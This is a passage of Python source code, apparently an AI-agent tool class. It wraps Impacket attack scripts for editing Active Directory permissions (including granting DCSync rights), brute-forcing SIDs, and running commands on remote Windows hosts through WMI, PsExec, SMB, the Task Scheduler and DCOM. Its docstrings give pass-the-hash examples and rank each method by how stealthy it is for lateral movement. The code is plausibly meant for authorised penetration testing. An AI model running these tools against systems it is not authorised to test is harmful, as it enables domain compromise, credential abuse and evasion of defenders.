            action: Action to perform - 'read', 'write', 'remove', 'backup', or 'restore' (required).
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            principal: Principal object sAMAccountName (for write/remove actions).
            principal_sid: Principal object Security Identifier.
            principal_dn: Principal object Distinguished Name.
            target: Target object sAMAccountName.
            target_sid: Target object Security Identifier.
            target_dn: Target object Distinguished Name.
            rights: Rights to write/remove - 'FullControl', 'ResetPassword', 'WriteMembers', 'DCSync'.
            rights_guid: Manual GUID for specific right.
            ace_type: ACE type - 'allowed' or 'denied' (default: allowed).
            inheritance: Enable inheritance for containers/OUs.
            use_ldaps: Use LDAPS instead of LDAP.
            file: Filename for backup/restore actions.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Validation
        if not (password or hashes or kerberos):
            raise ValueError(
                "Must provide at least one authentication method: password, hashes, or kerberos"
            )

        if not (target or target_sid or target_dn):
            raise ValueError(
                "Must provide at least one target identifier: target, target_sid, or target_dn"
            )

        if action in ("write", "remove") and not (
            principal or principal_sid or principal_dn
        ):
            raise ValueError(f"Must provide principal when action='{action}'")

        # Build identity
        identity = self._build_basic_identity(
            domain=domain, username=username, password=password
        )
        if not identity and not kerberos:
            raise ValueError(
                "Must provide domain/username unless using Kerberos authentication"
            )

        # Build command
        args = []
        if identity:
            args.append(identity)

        args.extend(["-action", action])

        if target:
            args.extend(["-target", target])

        if target_sid:
            args.extend(["-target-sid", target_sid])

        if target_dn:
            args.extend(["-target-dn", target_dn])

        if principal:
            args.extend(["-principal", principal])

        if principal_sid:
            args.extend(["-principal-sid", principal_sid])

        if principal_dn:
            args.extend(["-principal-dn", principal_dn])

        if rights:
            args.extend(["-rights", rights])

        if rights_guid:
            args.extend(["-rights-guid", rights_guid])

        if ace_type:
            args.extend(["-ace-type", ace_type])

        if inheritance:
            args.append("-inheritance")

        if use_ldaps:
            args.append("-use-ldaps")

        if file:
            args.extend(["-file", file])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip))

        return await execute(
            self._build_script_command("dacledit.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_lookup_sid(
        self,
        target: str,
        *,
        max_rid: int | None = None,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        target_ip: str | None = None,
        port: int | None = None,
        domain_sids: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket lookupsid.py to enumerate domain SIDs/RIDs.

        Enumerates user accounts and groups by bruteforcing SID/RID values.

        Usage Examples:
            # Enumerate domain SIDs up to RID 4000
            await impacket_lookup_sid(
                target="dc01.corp.local",
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Enumerate with custom max RID using NTLM hash
            await impacket_lookup_sid(
                target="dc01.corp.local",
                domain="corp.local",
                username="user",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0",
                max_rid=10000
            )

            # Enumerate domain SIDs without authentication
            await impacket_lookup_sid(
                target="dc01.corp.local",
                domain="corp.local",
                username="guest"
            )

        <documentation>
        positional arguments:
        target                [[domain/]username[:password]@]<targetName or address>
        maxRid                max Rid to check (default 4000)

        options:
        -h, --help            show this help message and exit
        -ts                   Adds timestamp to every logging output

        connection:
        -target-ip ip address
                                IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the
                                NetBIOS name and you cannot resolve it
        -port [destination port]
                                Destination port to connect to SMB Server
        -domain-sids          Enumerate Domain SIDs (will likely forward requests to the DC)

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful when proxying through smbrelayx)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                                cannot be found, it will use the ones specified in the command line
        </documentation>

        Args:
            target: Target hostname/IP (required).
            max_rid: Maximum RID to enumerate (default: 4000).
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            target_ip: Target machine IP address override.
            port: Destination port to connect to SMB server.
            domain_sids: Enumerate Domain SIDs (forwards to DC).
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Build identity with target
        identity = self._build_identity_with_target(
            target, domain=domain, username=username, password=password
        )

        # Build command
        args = [identity]

        if max_rid is not None:
            args.append(str(max_rid))

        if domain_sids:
            args.append("-domain-sids")

        if port is not None:
            args.extend(["-port", str(port)])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=None, password=password
            )
        )
        args.extend(self._build_connection_flags(target_ip=target_ip))

        return await execute(
            self._build_script_command("lookupsid.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    # -------------------------------------------------------------------
    # Lateral movement / remote command execution
    # -------------------------------------------------------------------

    @tool_method(catch=True)
    async def impacket_wmiexec(
        self,
        target: str,
        *,
        command: str | None = None,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        target_ip: str | None = None,
        share: str | None = None,
        shell_type: str | None = None,
        codec: str | None = None,
        silentcommand: bool = False,
        port: int | None = None,
        timeout: int | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute a command on a remote host via WMI (Windows Management Instrumentation).

        Lowest detection profile of the impacket execution tools — semi-interactive,
        no binary uploaded to disk, no service created. Preferred default for
        lateral movement when stealth matters.

        Usage Examples:
            # Execute a command via WMI
            await impacket_wmiexec(
                target="web01.corp.local",
                command="whoami /all",
                domain="corp.local",
                username="admin",
                password="Password123"
            )

            # Execute via pass-the-hash
            await impacket_wmiexec(
                target="10.10.10.5",
                command="ipconfig /all",
                domain="corp.local",
                username="administrator",
                hashes="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
            )

        <documentation>
        A semi-interactive shell, used through Windows Management Instrumentation. It does not require
        to install any service/agent at the target server. Runs as Administrator. Highly stealthy.

        positional arguments:
        target                [[domain/]username[:password]@]<targetName or address>
        command               command to execute at the target. If empty it will launch a semi-interactive shell

        options:
        -h, --help            show this help message and exit
        -share SHARE          share where the output will be grabbed from (default ADMIN$)
        -nooutput             whether or not to print the output (no SMB connection created)
        -ts                   Adds timestamp to every logging output
        -silentcommand        does not execute cmd.exe to run given command (no output, cannot determine returncode)
        -debug                Turn DEBUG output ON
        -codec CODEC          Sets encoding used (codec) from the target's output (default "utf-8").
        -shell-type {cmd,powershell}
                              choose a command processor for the semi-interactive shell

        authentication:
        -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication.
        -aesKey hex key       AES key to use for Kerberos Authentication

        connection:
        -dc-ip ip address     IP Address of the domain controller.
        -target-ip ip address IP Address of the target machine.
        -port [{139,445}]     Destination port to connect to SMB Server
        </documentation>

        Args:
            target: Target hostname or IP address (required).
            command: Command to execute on the remote host. If empty, returns shell banner.
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format.
            kerberos: Use Kerberos authentication.
            aes_key: AES key for Kerberos authentication.
            dc_ip: Domain controller IP address override.
            target_ip: Target machine IP address override.
            share: Share where output is grabbed from (default ADMIN$).
            shell_type: Command processor — 'cmd' or 'powershell'.
            codec: Output encoding codec (default utf-8).
            silentcommand: Execute without cmd.exe wrapper (no output returned).
            port: Destination SMB port (139 or 445).
            timeout: Command timeout in seconds (overrides default).
            env: Optional environment variables.
            input: Optional stdin input.
        """
        identity = self._build_identity_with_target(
            target, domain=domain, username=username, password=password
        )

        args = [identity]
        if command:
            args.append(command)

        if share:
            args.extend(["-share", share])
        if shell_type:
            args.extend(["-shell-type", shell_type])
        if codec:
            args.extend(["-codec", codec])
        if silentcommand:
            args.append("-silentcommand")
        if port is not None:
            args.extend(["-port", str(port)])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip, target_ip=target_ip))

        # If no command given, send exit to prevent interactive shell hang
        effective_input = input if command else (input or "exit\n")

        return await execute(
            self._build_script_command("wmiexec.py", args),
            timeout=timeout or self.timeout + 60,
            input=effective_input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_psexec(
        self,
        target: str,
        *,
        command: str | None = None,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        target_ip: str | None = None,
        port: int | None = None,
        service_name: str | None = None,
        remote_binary_name: str | None = None,
        codec: str | None = None,
        timeout: int | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute a command on a remote host via SMB service creation (PsExec-style).

        Creates a service on the target to execute commands. High detection profile —
        writes binary to disk and creates a Windows service. Use when reliability
        matters more than stealth, or when WMI/DCOM are blocked.

        Usage Examples:
            # Execute a command via PsExec
            await impacket_psexec(
                target="srv01.corp.local",
                command="whoami",
                domain="corp.local",
                username="admin",
                password="Password123"
            )

            # Execute via pass-the-hash with custom service name
            await impacket_psexec(
                target="10.10.10.5",
                command="ipconfig",
                domain="corp.local",
                username="administrator",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0",
                service_name="mySvc"
            )

        <documentation>
        PSEXEC like functionality example using RemComSvc.

        positional arguments:
        target                [[domain/]username[:password]@]<targetName or address>
        command               command (or arguments if -c is used) to execute at the target

        options:
        -h, --help            show this help message and exit
        -c pathname           upload the shareName binary and execute it
        -path PATH            path of the command to execute
        -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON
        -codec CODEC          Sets encoding used (codec) from the target's output
        -service-name service_name
                              The name of the service used to trigger the payload
        -remote-binary-name remote_binary_name
                              This will be the name of the executable uploaded on the target

        authentication:
        -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication.
        -aesKey hex key       AES key to use for Kerberos Authentication

        connection:
        -dc-ip ip address     IP Address of the domain controller.
        -target-ip ip address IP Address of the target machine.
        -port [{139,445}]     Destination port to connect to SMB Server
        </documentation>

        Args:
            target: Target hostname or IP address (required).
            command: Command to execute on the remote host.
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format.
            kerberos: Use Kerberos authentication.
            aes_key: AES key for Kerberos authentication.
            dc_ip: Domain controller IP address override.
            target_ip: Target machine IP address override.
            port: Destination SMB port (139 or 445).
            service_name: Custom name for the created service.
            remote_binary_name: Custom name for the uploaded executable.
            codec: Output encoding codec.
            timeout: Command timeout in seconds.
            env: Optional environment variables.
            input: Optional stdin input.
        """
        identity = self._build_identity_with_target(
            target, domain=domain, username=username, password=password
        )

        args = [identity]
        if command:
            args.append(command)

        if service_name:
            args.extend(["-service-name", service_name])
        if remote_binary_name:
            args.extend(["-remote-binary-name", remote_binary_name])
        if codec:
            args.extend(["-codec", codec])
        if port is not None:
            args.extend(["-port", str(port)])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip, target_ip=target_ip))

        # If no command given, send exit to prevent interactive shell hang
        effective_input = input if command else (input or "exit\n")

        return await execute(
            self._build_script_command("psexec.py", args),
            timeout=timeout or self.timeout + 60,
            input=effective_input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_smbexec(
        self,
        target: str,
        *,
        command: str | None = None,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        target_ip: str | None = None,
        port: int | None = None,
        share: str | None = None,
        mode: str | None = None,
        service_name: str | None = None,
        codec: str | None = None,
        timeout: int | None = None,
        env: dict[str, str] | None = None,
    ) -> str:
        r"""
        Execute a command on a remote host via SMB service creation (no binary upload).

        Similar to PsExec but does not upload a binary — creates a service that
        executes a command directly via cmd.exe. Medium detection profile.
        Use when WMI is blocked but you want to avoid uploading binaries.

        Note: smbexec opens a semi-interactive shell. The ``command`` parameter
        is sent via stdin; if omitted only the shell banner is returned.

        Usage Examples:
            # Execute a command via SMBExec
            await impacket_smbexec(
                target="srv01.corp.local",
                command="net user /domain",
                domain="corp.local",
                username="admin",
                password="Password123"
            )

        <documentation>
        A similar approach to PSEXEC w/o using RemComSvc. This implementation goes one step
        further, instantiating a local smbserver to receive the output of the commands.
        This is useful in the situation where the target machine does NOT have a writeable share available.

        positional arguments:
        target                [[domain/]username[:password]@]<targetName or address>

        options:
        -h, --help            show this help message and exit
        -share SHARE          share where the output will be grabbed from (default C$)
        -mode {SHARE,SERVER}  mode to use (default SHARE, SERVER requires root!)
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON
        -codec CODEC          Sets encoding used (codec) from the target's output
        -service-name service_name
                              The name of the service used to trigger the payload

        authentication:
        -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication.
        -aesKey hex key       AES key to use for Kerberos Authentication

        connection:
        -dc-ip ip address     IP Address of the domain controller.
        -target-ip ip address IP Address of the target machine.
        -port [{139,445}]     Destination port to connect to SMB Server
        </documentation>

        Args:
            target: Target hostname or IP address (required).
            command: Command to send via stdin. If omitted, returns shell banner only.
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format.
            kerberos: Use Kerberos authentication.
            aes_key: AES key for Kerberos authentication.
            dc_ip: Domain controller IP address override.
            target_ip: Target machine IP address override.
            port: Destination SMB port (139 or 445).
            share: Share for output capture (default C$).
            mode: Execution mode — 'SHARE' or 'SERVER'.
            service_name: Custom name for the created service.
            codec: Output encoding codec.
            timeout: Command timeout in seconds.
            env: Optional environment variables.
        """
        identity = self._build_identity_with_target(
            target, domain=domain, username=username, password=password
        )

        args = [identity]

        if share:
            args.extend(["-share", share])
        if mode:
            args.extend(["-mode", mode])
        if service_name:
            args.extend(["-service-name", service_name])
        if codec:
            args.extend(["-codec", codec])
        if port is not None:
            args.extend(["-port", str(port)])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip, target_ip=target_ip))

        # smbexec opens a shell — send command via stdin, then exit
        stdin_input = f"{command}\nexit\n" if command else "exit\n"

        return await execute(
            self._build_script_command("smbexec.py", args),
            timeout=timeout or self.timeout + 60,
            input=stdin_input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_atexec(
        self,
        target: str,
        command: str,
        *,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        target_ip: str | None = None,
        session_id: int | None = None,
        codec: str | None = None,
        timeout: int | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute a command on a remote host via the Windows Task Scheduler service.

        Creates a scheduled task to execute the command, then retrieves output.
        Medium detection profile. Use when SMB service creation and WMI are blocked.

        Usage Examples:
            # Execute a command via Task Scheduler
            await impacket_atexec(
                target="srv01.corp.local",
                command="whoami",
                domain="corp.local",
                username="admin",
                password="Password123"
            )

        <documentation>
        Executes a command on the target machine through the Task Scheduler service and
        returns the output of the executed command.

        positional arguments:
        target                [[domain/]username[:password]@]<targetName or address>
        command               command to execute at the target

        options:
        -h, --help            show this help message and exit
        -session-id SESSION_ID
                              an existed logon session to use (no output mode)
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON
        -codec CODEC          Sets encoding used (codec) from the target's output
        -silentcommand        does not execute cmd.exe to run given command

        authentication:
        -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication.
        -aesKey hex key       AES key to use for Kerberos Authentication

        connection:
        -dc-ip ip address     IP Address of the domain controller.
        -target-ip ip address IP Address of the target machine.
        </documentation>

        Args:
            target: Target hostname or IP address (required).
            command: Command to execute on the remote host (required).
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format.
            kerberos: Use Kerberos authentication.
            aes_key: AES key for Kerberos authentication.
            dc_ip: Domain controller IP address override.
            target_ip: Target machine IP address override.
            session_id: Existing logon session ID to use (no output mode).
            codec: Output encoding codec.
            timeout: Command timeout in seconds.
            env: Optional environment variables.
            input: Optional stdin input.
        """
        identity = self._build_identity_with_target(
            target, domain=domain, username=username, password=password
        )

        args = [identity, command]

        if session_id is not None:
            args.extend(["-session-id", str(session_id)])
        if codec:
            args.extend(["-codec", codec])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip, target_ip=target_ip))

        return await execute(
            self._build_script_command("atexec.py", args),
            timeout=timeout or self.timeout + 60,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_dcomexec(
        self,
        target: str,
        *,
        command: str | None = None,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        target_ip: str | None = None,
        share: str | None = None,
        dcom_object: str | None = None,
        shell_type: str | None = None,
        codec: str | None = None,
        silentcommand: bool = False,
        timeout: int | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute a command on a remote host via DCOM (Distributed Component Object Model).

        Uses DCOM objects for command execution. Low-medium detection profile depending
        on the DCOM object used. Alternative to WMI when WMI is filtered but DCOM is available.

        Usage Examples:
            # Execute via DCOM using MMC20 object
            await impacket_dcomexec(
                target="srv01.corp.local",
                command="whoami",
                domain="corp.local",
                username="admin",
                password="Password123",
                dcom_object="MMC20"
            )

            # Execute via ShellWindows object with pass-the-hash
            await impacket_dcomexec(
                target="10.10.10.5",
                command="net localgroup administrators",
                domain="corp.local",
                username="administrator",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0",
                dcom_object="ShellWindows"
            )

        <documentation>
        A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints.
        Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects.

        positional arguments:
        target                [[domain/]username[:password]@]<targetName or address>
        command               command to execute at the target. If empty it will launch a semi-interactive shell

        options:
        -h, --help            show this help message and exit
        -share SHARE          share where the output will be grabbed from (default ADMIN$)
        -nooutput             whether or not to print the output
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON
        -codec CODEC          Sets encoding used (codec) from the target's output
        -object [{ShellWindows,MMC20,ShellBrowserWindow}]
                              DCOM object to be used to execute commands
        -shell-type {cmd,powershell}
                              choose a command processor for the semi-interactive shell
        -silentcommand        does not execute cmd.exe to run given command

        authentication:
        -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication.
        -aesKey hex key       AES key to use for Kerberos Authentication

        connection:
        -dc-ip ip address     IP Address of the domain controller.
        -target-ip ip address IP Address of the target machine.
        </documentation>

        Args:
            target: Target hostname or IP address (required).
            command: Command to execute. If empty, returns shell banner.
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format.
            kerberos: Use Kerberos authentication.
            aes_key: AES key for Kerberos authentication.
            dc_ip: Domain controller IP address override.
            target_ip: Target machine IP address override.
            share: Share where output is grabbed from (default ADMIN$).
            dcom_object: DCOM object — 'MMC20', 'ShellWindows', or 'ShellBrowserWindow'.
            shell_type: Command processor — 'cmd' or 'powershell'.
            codec: Output encoding codec.
            silentcommand: Execute without cmd.exe wrapper (no output returned).
            timeout: Command timeout in seconds.
            env: Optional environment variables.
            input: Optional stdin input.
        """
        identity = self._build_identity_with_target(
            target, domain=domain, username=username, password=password
        )

        args = [identity]
        if command:
            args.append(command)

        if share:
            args.extend(["-share", share])
        if dcom_object:
            args.extend(["-object", dcom_object])
        if shell_type:
            args.extend(["-shell-type", shell_type])
        if codec:
            args.extend(["-codec", codec])
        if silentcommand:
            args.append("-silentcommand")

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip, target_ip=target_ip))

        # If no command given, send exit to prevent interactive shell hang
        effective_input = input if command else (input or "exit\n")

        return await execute(
            self._build_script_command("dcomexec.py", args),
            timeout=timeout or self.timeout + 60,
            input=effective_input,
            env=env,
        )
